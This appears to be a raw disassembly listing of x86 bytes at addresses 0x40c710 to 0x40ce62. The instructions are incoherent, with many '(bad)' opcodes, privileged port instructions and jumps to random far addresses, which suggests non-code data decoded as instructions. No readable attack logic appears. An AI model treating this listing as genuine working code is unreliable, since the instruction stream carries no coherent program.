  40c710:	inc    esi
  40c711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c712:	push   edx
  40c713:	adc    cl,BYTE PTR [ebx-0x11]
  40c716:	xchg   ecx,eax
  40c717:	aas    
  40c718:	pushf  
  40c719:	outs   dx,BYTE PTR ds:[esi]
  40c71a:	sub    ch,BYTE PTR [ecx+0x56]
  40c71d:	or     al,0xd
  40c71f:	dec    ebp
  40c720:	push   cs
  40c721:	push   eax
  40c722:	add    cl,BYTE PTR [esi-0x20]
  40c725:	fstp   TBYTE PTR [ecx]
  40c727:	call   0xfd89c263
  40c72c:	or     esi,DWORD PTR [esi+0x21]
  40c72f:	loope  0x40c714
  40c731:	into   
  40c732:	jge    0x40c71a
  40c734:	jns    0x40c6d7
  40c736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c737:	icebp  
  40c738:	imul   esi,DWORD PTR [ecx-0x6],0xee3e69d8
  40c73f:	fsub   DWORD PTR ss:[edi]
  40c742:	sub    eax,esi
  40c744:	(bad)  
  40c745:	retf   0x58f2
  40c748:	addr16 sbb al,0x23
  40c74b:	sub    DWORD PTR [esi],0x6b
  40c74e:	mov    BYTE PTR [ebp+ebp*2-0x38],dl
  40c752:	xchg   BYTE PTR [ebx+0x65],al
  40c755:	sbb    DWORD PTR [edi],ebx
  40c757:	xor    ecx,DWORD PTR [edi+0x52]
  40c75a:	out    0x9b,eax
  40c75c:	gs pusha 
  40c75e:	imul   edi,DWORD PTR [ebx+0x1afc0d1],0x7e7d2e5b
  40c768:	repnz lods al,BYTE PTR ds:[esi]
  40c76a:	(bad)  
  40c76b:	xor    BYTE PTR [ecx-0x65],dh
  40c76e:	xchg   ecx,eax
  40c76f:	dec    eax
  40c770:	scas   al,BYTE PTR es:[edi]
  40c771:	aas    
  40c772:	jge    0x40c7c1
  40c774:	inc    edx
  40c775:	inc    ecx
  40c776:	repnz sbb ah,dl
  40c779:	bound  edi,QWORD PTR [eax]
  40c77b:	imul   edx,ebp,0xffffffba
  40c77e:	adc    ebp,ebp
  40c780:	repnz and DWORD PTR [ecx-0x6d],eax
  40c784:	dec    esi
  40c785:	fidiv  WORD PTR [eax-0x35]
  40c788:	je     0x40c72c
  40c78a:	jno    0x40c7a2
  40c78c:	adc    ebx,DWORD PTR ds:0xef69fa7a
  40c792:	mov    WORD PTR [esp+esi*8+0x1195d266],fs
  40c799:	mov    ch,0xca
  40c79b:	xchg   ebp,eax
  40c79c:	sbb    esi,edi
  40c79e:	xor    al,0xc2
  40c7a1:	popa   
  40c7a2:	xchg   cl,cl
  40c7a4:	pop    ss
  40c7a5:	pusha  
  40c7a6:	mul    BYTE PTR [ebp-0x38d03a8d]
  40c7ac:	push   0x73791d27
  40c7b1:	ss push edx
  40c7b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7b4:	gs in  al,0x63
  40c7b7:	mov    al,0x41
  40c7b9:	lods   al,BYTE PTR ds:[esi]
  40c7ba:	pop    esp
  40c7bb:	(bad)  
  40c7bc:	and    eax,esp
  40c7be:	or     edx,esi
  40c7c0:	fcomi  st,st(5)
  40c7c2:	mov    ds:0xd695b70f,eax
  40c7c7:	cld    
  40c7c8:	ds loope 0x40c79a
  40c7cb:	jns    0x40c7ca
  40c7cd:	rcr    esp,1
  40c7cf:	sub    eax,0x15325ceb
  40c7d4:	out    0x74,eax
  40c7d6:	fwait
  40c7d7:	cmp    eax,0x4c35839f
  40c7dc:	or     eax,0x18e197d1
  40c7e1:	sbb    bl,bl
  40c7e3:	mov    edi,0xc1ee8ad7
  40c7e8:	cmp    bh,BYTE PTR [edi+0x23]
  40c7eb:	xor    DWORD PTR [esp+ebp*4+0x3ff8508],esp
  40c7f2:	in     al,0x3d
  40c7f4:	out    dx,eax
  40c7f5:	push   ss
  40c7f6:	mov    esp,0xec2da9f4
  40c7fb:	out    dx,al
  40c7fc:	push   ecx
  40c7fd:	mov    al,0x39
  40c7ff:	push   0xa11fa14d
  40c804:	aam    0x73
  40c806:	mov    eax,0xad52f487
  40c80b:	into   
  40c80c:	int    0xd8
  40c80e:	rcl    BYTE PTR ds:[edx+0x49],cl
  40c812:	leave  
  40c813:	repz and DWORD PTR [eax-0x7c],ecx
  40c817:	imul   edi,DWORD PTR [edi-0x6a],0xaab4dd5e
  40c81e:	and    eax,0x56c9b7a4
  40c823:	mov    DWORD PTR [esi],edx
  40c825:	ret    
  40c826:	pop    esp
  40c827:	test   eax,0x98c94e35
  40c82c:	push   ebx
  40c82d:	pop    ebp
  40c82e:	test   eax,0x3bf4692f
  40c833:	push   edx
  40c834:	cmp    esi,esp
  40c836:	push   0xffffff9b
  40c838:	inc    esi
  40c839:	adc    al,0xf7
  40c83b:	cmp    DWORD PTR [ebx-0x3334cd61],ebp
  40c841:	mov    ds:0xd8614ee0,eax
  40c846:	xor    ah,BYTE PTR [ebp+0x15822a91]
  40c84c:	pop    edi
  40c84d:	std    
  40c84e:	leave  
  40c84f:	push   ebp
  40c850:	mov    WORD PTR [eax+0x7a635990],?
  40c856:	xor    DWORD PTR [edx-0x80],edx
  40c859:	inc    ebp
  40c85a:	inc    esi
  40c85b:	pop    ds
  40c85c:	int    0xed
  40c85e:	stos   DWORD PTR es:[edi],eax
  40c85f:	sub    ebx,DWORD PTR [edx-0x3e]
  40c862:	test   al,0x61
  40c864:	call   0x1a3bb8a4
  40c869:	icebp  
  40c86a:	and    edi,DWORD PTR [ebp+0x6e]
  40c86d:	(bad)  
  40c86e:	adc    BYTE PTR [ebp+eiz*8-0x40f8df82],al
  40c875:	outs   dx,DWORD PTR ds:[esi]
  40c876:	fistp  DWORD PTR [edi-0x628d984f]
  40c87c:	pop    es
  40c87d:	mov    dh,0x9
  40c87f:	xchg   DWORD PTR [ecx],eax
  40c881:	retf   
  40c882:	pop    ebp
  40c883:	push   ss
  40c884:	repz ret 
  40c886:	idiv   BYTE PTR [edx+0x22]
  40c889:	es scas eax,DWORD PTR es:[edi]
  40c88b:	jo     0x40c8f7
  40c88d:	fcomp  st(7)
  40c88f:	in     al,0xd7
  40c891:	lods   eax,DWORD PTR ds:[esi]
  40c892:	ja     0x40c845
  40c894:	mov    dh,bh
  40c896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c897:	push   esi
  40c898:	shl    DWORD PTR [edi],1
  40c89a:	xchg   ebp,eax
  40c89b:	pop    ds
  40c89c:	push   ds
  40c89d:	stc    
  40c89e:	inc    edi
  40c89f:	adc    BYTE PTR [ebp-0x649c90e8],dh
  40c8a5:	pop    esi
  40c8a6:	and    al,0xc6
  40c8a8:	lods   eax,DWORD PTR ds:[esi]
  40c8a9:	inc    edi
  40c8aa:	push   edx
  40c8ab:	mov    BYTE PTR [esi+0x20],dl
  40c8ae:	add    ebx,edx
  40c8b0:	push   ebp
  40c8b1:	mov    eax,0x8897ac8d
  40c8b6:	stc    
  40c8b7:	inc    ebx
  40c8b8:	repnz sbb DWORD PTR [eax-0x35102dfa],edx
  40c8bf:	add    BYTE PTR [edi+0x28],0x79
  40c8c3:	xchg   edx,eax
  40c8c4:	adc    eax,0xbdc3a693
  40c8c9:	loope  0x40c8a0
  40c8cb:	or     ecx,0xcdf5dd1
  40c8d1:	(bad)
  40c8d4:	cmp    eax,ebx
  40c8d6:	jno    0x40c8cb
  40c8d8:	xchg   esp,eax
  40c8d9:	jmp    0xdd4a4e78
  40c8de:	push   ss
  40c8df:	pop    esp
  40c8e0:	fwait
  40c8e1:	inc    ecx
  40c8e2:	xor    eax,0x8b8b1cc9
  40c8e7:	cld    
  40c8e8:	bound  esi,QWORD PTR ds:[ecx+0x29730cb0]
  40c8ef:	push   ecx
  40c8f0:	cmp    BYTE PTR [eax],dh
  40c8f2:	std    
  40c8f3:	or     dl,BYTE PTR [ebp-0x8]
  40c8f6:	sbb    ebp,edx
  40c8f8:	nop
  40c8f9:	cwde   
  40c8fa:	mov    ebx,0x8ea1292e
  40c900:	fistp  QWORD PTR [edi+esi*1-0x4be625b6]
  40c907:	mov    DWORD PTR [esi-0x2e],eax
  40c90a:	mov    al,0x60
  40c90c:	fs dec ebp
  40c90e:	adc    al,0x8e
  40c910:	adc    cl,BYTE PTR [edi-0x110a5335]
  40c916:	pop    ebp
  40c917:	data16 aam 0x45
  40c91a:	lock or DWORD PTR [edx+0x7b9a95cc],ebp
  40c921:	push   eax
  40c922:	xchg   esi,eax
  40c923:	push   ecx
  40c924:	push   edi
  40c925:	mov    edx,0xb08d4ad7
  40c92a:	enter  0x11e0,0x86
  40c92e:	in     al,0x7e
  40c930:	add    BYTE PTR [eax-0x13],ch
  40c933:	mov    edi,0xb12a772a
  40c938:	aad    0x67
  40c93a:	sub    eax,0x2ea2f8fc
  40c93f:	(bad)  
  40c940:	ja     0x40c9bf
  40c942:	es xchg ecx,eax
  40c944:	inc    ebp
  40c945:	sbb    DWORD PTR [edi],edx
  40c947:	xchg   edi,eax
  40c948:	cdq    
  40c949:	jle    0x40c93b
  40c94b:	mov    WORD PTR [ecx],?
  40c94d:	retf   
  40c94e:	out    dx,al
  40c94f:	cmp    eax,0x708b0876
  40c954:	push   es
  40c955:	mov    dh,0x1c
  40c957:	inc    ecx
  40c958:	dec    edi
  40c959:	jae    0x40c901
  40c95b:	jge    0x40c968
  40c95d:	gs push 0xffffffc9
  40c960:	loopne 0x40c902
  40c962:	leave  
  40c963:	ja     0x40c910
  40c965:	ficom  DWORD PTR [edx+0x4]
  40c968:	jecxz  0x40c96c
  40c96a:	rol    BYTE PTR [edx+0x7e],0x17
  40c96e:	dec    esi
  40c96f:	pop    ebp
  40c970:	jl     0x40c9e0
  40c972:	ret    0x20a1
  40c975:	inc    esi
  40c976:	and    al,0xef
  40c978:	inc    edx
  40c979:	test   BYTE PTR [ebp+0x305e65f4],al
  40c97f:	mov    ds:0xc79cd746,al
  40c984:	push   0xd0068eb5
  40c989:	mov    edi,ecx
  40c98b:	mov    bh,0xc0
  40c98d:	fsubr  DWORD PTR [ebx+0x74985938]
  40c993:	jmp    0xc290:0x3335246e
  40c99a:	adc    BYTE PTR [ebx+0x77],al
  40c99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c99e:	cmp    eax,0xa7a3457b
  40c9a3:	loope  0x40ca11
  40c9a5:	add    eax,0x7d30a4da
  40c9aa:	stos   DWORD PTR es:[edi],eax
  40c9ab:	lea    esi,[eax+0x1749cab9]
  40c9b1:	pop    ebp
  40c9b2:	mov    al,0xfd
  40c9b4:	in     al,dx
  40c9b5:	xchg   BYTE PTR [esi+edi*1+0x6c],dl
  40c9b9:	std    
  40c9ba:	or     eax,0xe57aa1d8
  40c9bf:	cmp    DWORD PTR ds:0x43ad58dd,ecx
  40c9c5:	push   edx
  40c9c6:	mov    ah,0x56
  40c9c8:	repnz loop 0x40ca22
  40c9cb:	adc    al,0x97
  40c9cd:	xchg   BYTE PTR [eax-0x3a],dl
  40c9d0:	ds nop
  40c9d2:	xlat   BYTE PTR ds:[ebx]
  40c9d3:	or     DWORD PTR [edx],ebp
  40c9d5:	jecxz  0x40c9e6
  40c9d7:	jecxz  0x40c98b
  40c9d9:	hlt    
  40c9da:	push   ebp
  40c9db:	dec    esp
  40c9dc:	cmp    al,0x88
  40c9de:	dec    edx
  40c9df:	aam    0xad
  40c9e1:	pop    edi
  40c9e2:	xchg   ecx,eax
  40c9e3:	push   es
  40c9e4:	xor    eax,0x3e2643d3
  40c9e9:	lea    esi,[edx]
  40c9eb:	jmp    0x40c990
  40c9ed:	leave  
  40c9ee:	xchg   esp,eax
  40c9ef:	pop    edi
  40c9f0:	out    dx,al
  40c9f1:	(bad)  
  40c9f3:	jns    0x40c998
  40c9f5:	inc    ecx
  40c9f6:	ror    BYTE PTR [edx+0x6674bea4],0x8b
  40c9fd:	call   0x465e:0x9b97bfb1
  40ca04:	xlat   BYTE PTR ds:[ebx]
  40ca05:	js     0x40c996
  40ca07:	in     eax,0xd8
  40ca09:	cli    
  40ca0a:	mov    ecx,ecx
  40ca0c:	gs aam 0x1c
  40ca0f:	inc    esi
  40ca10:	sar    BYTE PTR [ebx],0x62
  40ca13:	stos   DWORD PTR es:[edi],eax
  40ca14:	xor    DWORD PTR [edi+0x5020ccbc],ebx
  40ca1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca1b:	repnz push ds
  40ca1d:	push   ds
  40ca1e:	pop    ebx
  40ca1f:	lahf   
  40ca20:	jge    0x40ca62
  40ca22:	fadd   DWORD PTR [eax]
  40ca24:	inc    esi
  40ca25:	pop    edi
  40ca26:	loope  0x40c9bd
  40ca28:	retf   
  40ca29:	jo     0x40ca52
  40ca2b:	push   0xffffffb4
  40ca2d:	xor    eax,ebp
  40ca2f:	xlat   BYTE PTR ds:[ebx]
  40ca30:	xlat   BYTE PTR ds:[ebx]
  40ca31:	mov    WORD PTR [esi-0x46],fs
  40ca34:	mov    dh,0xbf
  40ca36:	ins    DWORD PTR es:[edi],dx
  40ca37:	adc    ah,BYTE PTR ds:0x854cb85c
  40ca3d:	mov    bl,0x17
  40ca3f:	cmp    al,0xb5
  40ca41:	mov    ebp,0x9d6cf571
  40ca46:	add    BYTE PTR [ebp-0x3b3b2b2c],al
  40ca4c:	inc    ebp
  40ca4d:	sbb    al,0x1d
  40ca4f:	fwait
  40ca50:	xchg   edi,eax
  40ca51:	js     0x40ca2b
  40ca53:	push   ss
  40ca54:	mul    BYTE PTR ds:0x9c7ea02f
  40ca5a:	aaa    
  40ca5b:	lods   eax,DWORD PTR ds:[esi]
  40ca5c:	stc    
  40ca5d:	ins    DWORD PTR es:[edi],dx
  40ca5e:	clc    
  40ca5f:	loopne 0x40ca2e
  40ca61:	xchg   edi,eax
  40ca62:	xor    BYTE PTR [eax],cl
  40ca64:	test   BYTE PTR [edi+0xceb4242],bl
  40ca6a:	inc    esp
  40ca6b:	or     DWORD PTR [edx+0x28],esi
  40ca6e:	inc    ecx
  40ca6f:	test   eax,0x8a9ae5f9
  40ca74:	fcomp  DWORD PTR ds:0x76692ade
  40ca7a:	push   esp
  40ca7b:	repnz and ebp,DWORD PTR [eax]
  40ca7e:	mov    esp,0x7a5181bf
  40ca83:	mov    eax,ds:0x34200ebf
  40ca88:	push   edi
  40ca89:	fst    DWORD PTR [edx]
  40ca8b:	fcom   st(0)
  40ca8d:	jle    0x40cabe
  40ca8f:	lods   al,BYTE PTR ds:[esi]
  40ca90:	jg     0x40caa9
  40ca92:	in     eax,dx
  40ca93:	mov    ebx,DWORD PTR [edx+ecx*2-0x42]
  40ca97:	push   esp
  40ca98:	ret    0x4b8
  40ca9b:	and    DWORD PTR [ebx-0x6],edi
  40ca9e:	cmp    BYTE PTR [eax-0xa],0x0
  40caa2:	xor    bh,BYTE PTR [ebx+0x15b9188f]
  40caa8:	or     ecx,ebp
  40caaa:	sub    BYTE PTR [ecx-0x54],dh
  40caad:	mov    dl,0x2
  40caaf:	ins    BYTE PTR es:[edi],dx
  40cab0:	stos   DWORD PTR es:[edi],eax
  40cab1:	or     DWORD PTR [ebp-0x7ce42371],edx
  40cab7:	lods   al,BYTE PTR ds:[esi]
  40cab8:	xchg   bh,bh
  40caba:	or     BYTE PTR ds:0x20dc23e2,bl
  40cac0:	rep lods al,BYTE PTR ds:[esi]
  40cac2:	pop    esp
  40cac3:	gs jbe 0x40cb0a
  40cac6:	push   0xffffffb8
  40cac8:	xor    eax,0xa5050ab7
  40cacd:	pop    esi
  40cace:	mov    cl,BYTE PTR [esi-0x5ba1f774]
  40cad4:	inc    esp
  40cad5:	mov    DWORD PTR [edx],ecx
  40cad7:	scas   eax,DWORD PTR es:[edi]
  40cad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cad9:	mov    cl,0x38
  40cadb:	call   0xd3ee:0x9dff9258
  40cae2:	xchg   ebp,eax
  40cae3:	loop   0x40cb5e
  40cae5:	addr16 inc ecx
  40cae7:	ret    
  40cae8:	jp     0x40cafa
  40caea:	sbb    ebx,ecx
  40caec:	fistp  QWORD PTR [ecx]
  40caee:	jb     0x40ca97
  40caf0:	and    BYTE PTR [ebx],dl
  40caf2:	das    
  40caf3:	in     al,0xfe
  40caf5:	dec    edx
  40caf6:	(bad)  
  40caf7:	mov    edi,0x9906f217
  40cafc:	(bad)  
  40cafd:	adc    BYTE PTR [edx-0x3b],cl
  40cb00:	inc    edx
  40cb01:	mov    ds:0xffe6b65e,al
  40cb06:	mov    ebp,0xafbd4468
  40cb0b:	stos   DWORD PTR es:[edi],eax
  40cb0c:	(bad)  
  40cb0d:	popa   
  40cb0e:	pop    ss
  40cb0f:	dec    esi
  40cb10:	cmp    DWORD PTR [ecx+0x7f],edx
  40cb13:	scas   eax,DWORD PTR es:[edi]
  40cb14:	add    eax,0x911bf20f
  40cb19:	mov    ch,BYTE PTR ds:0x5228318d
  40cb1f:	imul   eax,DWORD PTR [edi-0x2f],0xffffff83
  40cb23:	in     eax,0x6f
  40cb25:	aaa    
  40cb26:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb28:	add    ecx,esp
  40cb2a:	push   es
  40cb2b:	shr    DWORD PTR [esi-0x799f5eab],cl
  40cb31:	pop    edx
  40cb32:	xor    BYTE PTR [edx],ah
  40cb34:	pop    ss
  40cb35:	ror    DWORD PTR [ecx-0x13],1
  40cb38:	adc    esi,ebp
  40cb3a:	jnp    0x40cb36
  40cb3c:	sti    
  40cb3d:	cmp    ah,ah
  40cb3f:	aas    
  40cb40:	mov    ebx,edx
  40cb42:	imul   edi,DWORD PTR [ebx],0x3e35312e
  40cb48:	adc    eax,0x5e42c68f
  40cb4d:	loop   0x40cb02
  40cb4f:	cmp    al,0x79
  40cb51:	add    BYTE PTR [edx+0x71],bh
  40cb54:	mul    DWORD PTR [edi]
  40cb56:	mov    edx,0x988f905e
  40cb5b:	int3   
  40cb5c:	mov    ch,0x9a
  40cb5e:	jns    0x40cb36
  40cb60:	(bad)  
  40cb61:	fdivrp st(1),st
  40cb63:	jmp    0x3cce:0xfd34773d
  40cb6a:	mov    ah,0x65
  40cb6c:	lods   al,BYTE PTR ds:[esi]
  40cb6d:	adc    eax,0xbc5f0775
  40cb72:	fwait
  40cb73:	imul   edx,DWORD PTR [ebp+0x9fb112c],0xffffffec
  40cb7a:	cmp    dh,BYTE PTR [ebx+ebp*2]
  40cb7d:	mov    bl,BYTE PTR [ecx+0x2b]
  40cb80:	mov    esi,0xdbe8d65e
  40cb85:	push   esi
  40cb86:	push   cs
  40cb87:	ss out dx,eax
  40cb89:	sub    eax,0xf0a78842
  40cb8e:	fldlg2 
  40cb90:	jecxz  0x40cbdd
  40cb92:	pop    ecx
  40cb93:	xor    eax,DWORD PTR [ecx+eiz*8-0x526d152c]
  40cb9a:	mov    al,ds:0xc8e74ab7
  40cb9f:	mov    dl,BYTE PTR ds:0x71e8be62
  40cba5:	in     al,dx
  40cba6:	(bad)  
  40cba7:	cmp    al,0x20
  40cba9:	pop    ecx
  40cbaa:	pandn  mm2,QWORD PTR [esi+esi*1-0x24d4b013]
  40cbb2:	sub    esi,DWORD PTR [ebx+0x20b22201]
  40cbb8:	ret    
  40cbb9:	inc    edi
  40cbba:	inc    esp
  40cbbb:	jnp    0x40cb45
  40cbbd:	call   FWORD PTR [ebx+0x74]
  40cbc0:	sbb    ecx,DWORD PTR [edx]
  40cbc2:	push   ecx
  40cbc3:	sbb    eax,0xdc6d1870
  40cbc8:	mov    edx,0xaa0dcf47
  40cbcd:	or     al,0x4d
  40cbcf:	fadd   DWORD PTR [esi-0x52]
  40cbd2:	xchg   BYTE PTR [edi+ecx*8],bh
  40cbd5:	xchg   edx,edx
  40cbd7:	repnz mov dl,0xeb
  40cbda:	push   ecx
  40cbdb:	cs pop esi
  40cbdd:	leave  
  40cbde:	mov    ch,0xbe
  40cbe0:	mov    ebp,0xa48e8c81
  40cbe5:	mov    eax,0xc8e17d0b
  40cbea:	push   ds
  40cbeb:	cwde   
  40cbec:	outs   dx,BYTE PTR ds:[esi]
  40cbed:	outs   dx,DWORD PTR ds:[esi]
  40cbee:	jno    0x40cbaf
  40cbf0:	pop    ecx
  40cbf1:	nop
  40cbf2:	add    DWORD PTR [ebx+0x30],esp
  40cbf5:	cmp    BYTE PTR [ebp+0x349aeeb2],ch
  40cbfb:	jns    0x40cb9c
  40cbfd:	inc    esp
  40cbfe:	push   esi
  40cbff:	fbld   TBYTE PTR [ebx-0x7051300a]
  40cc05:	and    BYTE PTR [eax-0x1d61c4c1],0x6b
  40cc0c:	icebp  
  40cc0d:	sub    ch,BYTE PTR [bx+0x6485]
  40cc12:	xor    eax,0x96a96960
  40cc17:	fwait
  40cc18:	ss repz adc al,0x3c
  40cc1c:	dec    ebp
  40cc1d:	lea    esp,[ebx-0x6d9b2d1c]
  40cc23:	or     BYTE PTR [ebx-0x63],0x10
  40cc27:	sbb    BYTE PTR [esi-0x5e],dh
  40cc2a:	pop    esi
  40cc2b:	aaa    
  40cc2c:	scas   eax,DWORD PTR es:[edi]
  40cc2d:	cmp    DWORD PTR [ebp+0x107e9f8],esi
  40cc33:	jmp    0xae66:0xf7e553b
  40cc3a:	xchg   edi,eax
  40cc3b:	pusha  
  40cc3c:	pushf  
  40cc3d:	and    DWORD PTR [edx],esi
  40cc3f:	scas   eax,DWORD PTR es:[edi]
  40cc40:	or     al,0x23
  40cc42:	pop    es
  40cc43:	pop    ebp
  40cc44:	cmp    BYTE PTR [esi+eax*2+0x39],dl
  40cc48:	mov    al,0x52
  40cc4a:	and    ch,BYTE PTR [eax]
  40cc4c:	mov    eax,0xfc394e9f
  40cc51:	inc    ebx
  40cc52:	stos   DWORD PTR es:[edi],eax
  40cc53:	push   0x3076585f
  40cc58:	in     eax,dx
  40cc59:	sub    BYTE PTR [esi-0x80],bh
  40cc5c:	mov    ds:0xa5190e,eax
  40cc61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc62:	cwde   
  40cc63:	sahf   
  40cc64:	test   al,0x56
  40cc66:	aas    
  40cc67:	fist   DWORD PTR [eax-0x1195bcb5]
  40cc6d:	adc    BYTE PTR [ebx+0x105ca486],ah
  40cc73:	and    BYTE PTR [edx-0x2a],ch
  40cc76:	jb     0x40cc1c
  40cc78:	jne    0x40ccd0
  40cc7a:	inc    edx
  40cc7b:	daa    
  40cc7c:	shl    DWORD PTR [esi],0x61
  40cc7f:	fcmovne st,st(1)
  40cc81:	xchg   dl,al
  40cc83:	std    
  40cc84:	test   al,0x5e
  40cc86:	jmp    FWORD PTR [edi]
  40cc88:	nop
  40cc89:	cmp    edi,DWORD PTR [ebx]
  40cc8b:	push   0x43d4892
  40cc90:	aaa    
  40cc91:	dec    eax
  40cc92:	adc    ebx,esi
  40cc94:	out    0xfb,al
  40cc96:	cli    
  40cc97:	xlat   BYTE PTR ds:[ebx]
  40cc98:	or     eax,0x940598c4
  40cc9d:	jl     0x40ccac
  40cc9f:	(bad)  
  40cca0:	ss mov dh,0xe6
  40cca3:	xor    esp,DWORD PTR [ebx+0x3c]
  40cca6:	(bad)  
  40cca7:	dec    edx
  40cca8:	sti    
  40cca9:	push   eax
  40ccaa:	dec    ebp
  40ccab:	dec    edi
  40ccac:	sub    eax,0xa40610fb
  40ccb1:	xchg   ebx,eax
  40ccb2:	nop
  40ccb3:	fild   QWORD PTR [esi+0x63]
  40ccb6:	pusha  
  40ccb7:	mov    WORD PTR [esp+edi*1],ss
  40ccba:	in     eax,0xfc
  40ccbc:	xchg   DWORD PTR [eax+esi*4+0x63526206],ebp
  40ccc3:	pop    esp
  40ccc4:	jl     0x40ccf7
  40ccc6:	int3   
  40ccc7:	adc    DWORD PTR [edx+0xb6beea0],edi
  40cccd:	or     eax,0xa7ea971f
  40ccd2:	call   0x8d567e09
  40ccd7:	xchg   esi,eax
  40ccd8:	mov    ds:0x800ff6af,eax
  40ccdd:	mov    dl,0x39
  40ccdf:	sbb    ebx,DWORD PTR ds:0x5ec817f0
  40cce5:	sub    eax,eax
  40cce7:	imul   edx,DWORD PTR [ebx],0x53
  40ccea:	push   esi
  40cceb:	pop    ds
  40ccec:	mov    edi,0xdf4c5d19
  40ccf1:	pop    ebp
  40ccf2:	jo     0x40cd58
  40ccf4:	cmp    eax,0x8b1af7c9
  40ccf9:	in     al,0xe2
  40ccfb:	push   0x5f912ff2
  40cd00:	cmp    BYTE PTR [ecx+0x24d2c6e6],ah
  40cd06:	push   edi
  40cd07:	je     0x40cd5a
  40cd09:	and    eax,0x4949ac96
  40cd0e:	jmp    0x40cc95
  40cd10:	xor    dl,BYTE PTR [ebx-0x66c8f533]
  40cd16:	sbb    esi,DWORD PTR [ebx-0x2bd139f7]
  40cd1c:	in     eax,0x95
  40cd1e:	aas    
  40cd1f:	adc    ecx,DWORD PTR [edx]
  40cd21:	leave  
  40cd22:	mov    edi,0xd67920b4
  40cd27:	mov    ecx,0x5a60afa0
  40cd2c:	test   edi,0x7d21dd9
  40cd32:	lods   al,BYTE PTR ds:[esi]
  40cd33:	xor    BYTE PTR [ebx+0x73804eb0],bl
  40cd39:	mov    ebx,0x35331a44
  40cd3e:	fucomip st,st(2)
  40cd40:	sub    edi,DWORD PTR [edx-0x5b56063b]
  40cd46:	shl    DWORD PTR [edx],0x92
  40cd49:	push   esi
  40cd4a:	pusha  
  40cd4b:	xchg   ebp,eax
  40cd4c:	cmp    bl,BYTE PTR [ebp-0x670e8431]
  40cd52:	xor    al,0x79
  40cd54:	and    BYTE PTR [ebx],al
  40cd56:	mov    ch,0xf1
  40cd58:	jns    0x40cd89
  40cd5a:	fidivr DWORD PTR [edi-0x50]
  40cd5d:	xchg   edx,eax
  40cd5e:	mov    esp,0x6212e20c
  40cd63:	cmp    BYTE PTR [edi],al
  40cd65:	pusha  
  40cd66:	(bad)  
  40cd67:	sar    DWORD PTR [ebx+0x38],cl
  40cd6a:	add    BYTE PTR [edi],cl
  40cd6c:	pop    ds
  40cd6d:	pushf  
  40cd6e:	ret    
  40cd6f:	lds    ebp,FWORD PTR [eax]
  40cd71:	mov    DWORD PTR [edi],edx
  40cd73:	mov    edx,0xfa1093ad
  40cd78:	call   0x9486fc37
  40cd7d:	pop    es
  40cd7e:	and    cl,BYTE PTR [esi]
  40cd80:	enter  0x97bd,0xdc
  40cd84:	adc    BYTE PTR [edi],ch
  40cd86:	dec    edx
  40cd87:	mov    al,0x7c
  40cd89:	xor    edi,esp
  40cd8b:	jle    0x40cd39
  40cd8d:	xchg   ebx,eax
  40cd8e:	fs xchg esi,eax
  40cd90:	(bad)  
  40cd91:	push   0x8013238d
  40cd96:	fidiv  DWORD PTR fs:[ebx]
  40cd99:	xor    eax,0xe5521651
  40cd9e:	and    DWORD PTR [edx],0x71
  40cda1:	clc    
  40cda2:	xor    ah,BYTE PTR [edi+eiz*2]
  40cda5:	ja     0x40ce1b
  40cda7:	jnp    0x40cd89
  40cda9:	xor    ebx,ecx
  40cdab:	popa   
  40cdac:	call   0xcd4f:0x7de277e6
  40cdb3:	jp     0x40cdcd
  40cdb5:	xor    eax,0x5cecbed8
  40cdba:	cld    
  40cdbb:	rol    BYTE PTR [ecx+esi*1+0xa],0x34
  40cdc0:	pop    ebx
  40cdc1:	xor    esp,DWORD PTR [esi-0x18d22dfd]
  40cdc7:	(bad)  
  40cdc8:	ficom  WORD PTR [eax]
  40cdca:	stos   BYTE PTR es:[edi],al
  40cdcb:	jle    0x40cde9
  40cdcd:	pushf  
  40cdce:	rcl    BYTE PTR [edx+0x3bb3974f],cl
  40cdd4:	aaa    
  40cdd5:	cs push es
  40cdd7:	mov    bl,0x9c
  40cdd9:	mov    dl,0x28
  40cddb:	icebp  
  40cddc:	retf   0xb850
  40cddf:	in     al,dx
  40cde0:	mov    ebx,0x9673a4b
  40cde5:	mov    DWORD PTR [ebx+eax*8+0x3b2c6b3e],ecx
  40cdec:	fmul   st(7),st
  40cdee:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40cdf0:	add    eax,0x11e2b1cb
  40cdf5:	(bad)  
  40cdf6:	ret    0xaff5
  40cdf9:	push   esp
  40cdfa:	or     DWORD PTR [ebx-0x389599b8],edi
  40ce00:	lds    ecx,FWORD PTR [eax+0x4adcd52a]
  40ce06:	ds das 
  40ce08:	pusha  
  40ce09:	sbb    eax,0xe11f1b04
  40ce0e:	pusha  
  40ce0f:	add    eax,0xc36fe7d0
  40ce14:	loopne 0x40ce8c
  40ce16:	or     ebp,0xffffff8c
  40ce19:	ins    BYTE PTR es:[edi],dx
  40ce1a:	sbb    BYTE PTR [edi+0x6bd7752f],0x2b
  40ce21:	mov    ebp,0x3bfd088d
  40ce26:	mov    edi,0xeb7c07b7
  40ce2b:	scas   eax,DWORD PTR es:[edi]
  40ce2c:	pop    ecx
  40ce2d:	mov    ecx,0xfd3c359e
  40ce32:	sbb    cl,BYTE PTR [esi-0x77]
  40ce35:	or     DWORD PTR [ebp+0xf],edx
  40ce38:	test   BYTE PTR [edx-0x53],0x68
  40ce3c:	jmp    0x7ca1:0x1fa8568f
  40ce43:	lods   al,BYTE PTR ds:[esi]
  40ce44:	sahf   
  40ce45:	or     BYTE PTR [ebp+ebx*8+0x7b8f696e],dl
  40ce4c:	add    al,0x61
  40ce4e:	xlat   BYTE PTR ds:[ebx]
  40ce4f:	fstp   st(6)
  40ce51:	sbb    ebx,esp
  40ce53:	std    
  40ce54:	aam    0x54
  40ce56:	test   BYTE PTR [edi],al
  40ce58:	scas   eax,DWORD PTR es:[edi]
  40ce59:	inc    BYTE PTR [ecx-0x70]
  40ce5c:	mov    bh,0xca
  40ce5e:	or     bh,BYTE PTR [ecx]
  40ce60:	inc    eax
  40ce61:	push   ds
  40ce62:	push   es
